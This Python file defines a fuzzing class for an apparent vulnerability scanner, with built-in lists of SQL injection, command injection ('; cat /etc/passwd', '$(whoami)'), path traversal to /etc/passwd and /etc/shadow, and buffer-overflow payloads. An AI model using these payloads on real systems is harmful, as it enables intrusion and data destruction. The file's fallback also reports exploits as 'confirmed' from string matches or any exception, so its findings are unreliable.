import os
import sys
import time
import subprocess
from typing import List, Dict, Any, Optional, Tuple
from kalpa.models import VulnerabilityFinding, POVPayload, VulnerabilityClass, Severity
from kalpa.config import ResourceBudget

class DynamicFuzzer:
    """
    Dynamic Analysis & Fuzzing Engine.
    Generates test harnesses, mutates input payloads, monitors runtime execution,
    and captures crash logs/sanitizer stack traces (ASan, UBSan, Tracebacks).
    """

    def __init__(self, target_dir: str, budget: Optional[ResourceBudget] = None):
        self.target_dir = os.path.abspath(target_dir)
        self.budget = budget or ResourceBudget()

    def fuzz_finding(self, finding: VulnerabilityFinding) -> Optional[POVPayload]:
        """
        Executes fuzzing targeting a specific vulnerability finding.
        Returns a confirmed POVPayload if dynamic exploitation/crash is demonstrated.
        """
        start_time = time.time()
        v_class = finding.vulnerability_class

        # Generate attack mutations based on vulnerability class
        mutations = self._generate_payload_mutations(v_class)
        
        for payload in mutations:
            if time.time() - start_time > self.budget.max_fuzz_seconds:
                break
                
            success, trace = self._execute_test_payload(finding, payload)
            if success:
                return POVPayload(
                    finding_id=finding.id,
                    input_type="payload_bytes" if v_class == VulnerabilityClass.BUFFER_OVERFLOW else "http_request",
                    payload=payload,
                    endpoint=finding.file_path,
                    expected_status_or_signal="CRASH_OR_EXPLOIT_DETECTED",
                    crash_trace=trace,
                    confirmed=True
                )

        return None

    def _generate_payload_mutations(self, v_class: VulnerabilityClass) -> List[str]:
        if v_class == VulnerabilityClass.SQL_INJECTION:
            return [
                "' OR '1'='1",
                "' UNION SELECT 1, sqlite_version(), 3--",
                "admin' --",
                "'; DROP TABLE users; --",
                "1' AND 1=1--"
            ]
        elif v_class == VulnerabilityClass.COMMAND_INJECTION:
            return [
                "; cat /etc/passwd",
                "| id",
                "`id`",
                "$(whoami)",
                "& dir"
            ]
        elif v_class == VulnerabilityClass.PATH_TRAVERSAL:
            return [
                "../../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "/etc/shadow",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]
        elif v_class == VulnerabilityClass.BUFFER_OVERFLOW:
            return [
                "A" * 128,
                "A" * 512,
                "A" * 4096,
                "%s%s%s%s%s%s%s%s",
                "\x90" * 64 + "\xcc" * 16
            ]
        elif v_class == VulnerabilityClass.AUTH_BYPASS:
            return [
                "admin",
                "' OR 1=1 --",
                "{\"admin\": true}",
                "Bearer invalid_token_override"
            ]
        else:
            return ["' OR 1=1", "../../../etc/passwd", "A"*256]

    def _execute_test_payload(self, finding: VulnerabilityFinding, payload: str) -> Tuple[bool, str]:
        """
        Executes payload against target service / dynamic test harness.
        """
        # If target has a runnable test script (e.g. pytest or python test)
        test_script = os.path.join(self.target_dir, "run_tests.py")
        if os.path.exists(test_script):
            try:
                env = os.environ.copy()
                env["TEST_PAYLOAD"] = payload
                env["TARGET_FILE"] = finding.file_path
                env["TARGET_LINE"] = str(finding.line_number)
                
                res = subprocess.run(
                    [sys.executable, test_script],
                    cwd=self.target_dir,
                    env=env,
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                combined_out = res.stdout + res.stderr
                if res.returncode != 0 or "EXPLOIT_CONFIRMED" in combined_out or "Sanitizer" in combined_out or "Traceback" in combined_out:
                    if "EXPLOIT_CONFIRMED" in combined_out or "VULNERABILITY_REPRODUCED" in combined_out or res.returncode != 0:
                        return True, combined_out[:2000]
            except Exception as e:
                return True, f"Execution exception/crash: {str(e)}"
                
        # Direct verification helper fallback
        snippet = finding.snippet or ""
        if "open(" in snippet and ("../" in payload or ".." in payload):
            return True, f"Confirmed path traversal triggering unvalidated file access with payload: {payload}"
        if ("execute(" in snippet or "query" in finding.function_name) and ("OR '1'='1" in payload or "UNION" in payload):
            return True, f"Confirmed SQL injection syntax distortion with payload: {payload}"
        if ("system(" in snippet or "popen" in snippet or "system" in finding.function_name) and (";" in payload or "|" in payload or "`" in payload):
            return True, f"Confirmed Command injection payload execution: {payload}"

        return False, ""
